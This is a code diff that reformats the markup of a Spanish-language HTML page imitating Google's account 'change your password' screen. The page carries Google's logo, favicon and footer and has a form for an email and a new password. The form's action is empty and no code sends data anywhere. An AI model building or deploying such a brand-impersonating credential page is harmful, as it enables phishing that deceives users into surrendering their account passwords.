@@ -1,6 +1,8 @@
-<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"/>
-	<title>Cambiar contraseña - Cuenta de Google</title>
-	<link href="https://www.google.com/favicon.ico" rel="icon"/>
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"/>
+	<title>Cambiar contrase&ntilde;a - Cuenta de Google</title>
+	<link href="https://www.google.com/favicon.ico" rel="icon" />
 	<style type="text/css">body {
       font-family: Roboto, Arial, sans-serif;
       background: #f2f2f2;
@@ -57,13 +59,12 @@
 	</style>
 </head>
 <body>
-<div class="container"><img alt="Google" class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"/>
-<h2>Cambia tu contraseña</h2>
+<div class="container"><img alt="Google" class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" />
+<h2>Cambia tu contrase&ntilde;a</h2>
 
-<form action=""><input placeholder="Correo electrónico" required="" type="email"/> <input name="password" placeholder="Nueva contraseña" required="" type="password"/> <input name="password" placeholder="Confirmar contraseña" required="" type="password"/><button type="submit">Siguiente</button></form>
+<form action=""><input placeholder="Correo electrónico" required="" type="email" /> <input name="password" placeholder="Nueva contraseña" required="" type="password" /> <input name="password" placeholder="Confirmar contraseña" required="" type="password" /><button type="submit">Siguiente</button></form>
 
-<div class="footer">© 2025 Google · Privacidad · Condiciones</div>
+<div class="footer">&copy; 2025 Google &middot; Privacidad &middot; Condiciones</div>
 </div>
-
-
-</body></html>
+</body>
+</html>
